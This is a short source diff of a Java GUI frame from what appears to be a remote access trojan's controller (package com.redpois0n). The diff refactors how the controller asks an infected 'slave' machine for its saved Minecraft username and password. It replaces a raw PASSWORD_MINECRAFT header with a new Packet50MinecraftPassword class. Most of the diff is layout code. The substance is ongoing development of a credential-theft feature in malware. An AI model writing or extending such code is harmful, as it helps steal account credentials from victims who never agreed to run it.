@@ -17,6 +17,7 @@ import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
 import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet50MinecraftPassword;
 
 @SuppressWarnings("serial")
 public class FrameMinecraft extends BaseFrame {
@@ -77,7 +78,8 @@ public class FrameMinecraft extends BaseFrame {
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(lblUsername).addComponent(txtUser, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblPassword)).addPreferredGap(ComponentPlacement.RELATED, 35, Short.MAX_VALUE).addComponent(lblStatus).addContainerGap()));
 		contentPane.setLayout(gl_contentPane);
 		setVisible(true);
-		slave.addToSendQueue(OutgoingHeader.PASSWORD_MINECRAFT);
+		
+		slave.addToSendQueue(new Packet50MinecraftPassword());
 	}
 
 	public void exit() {
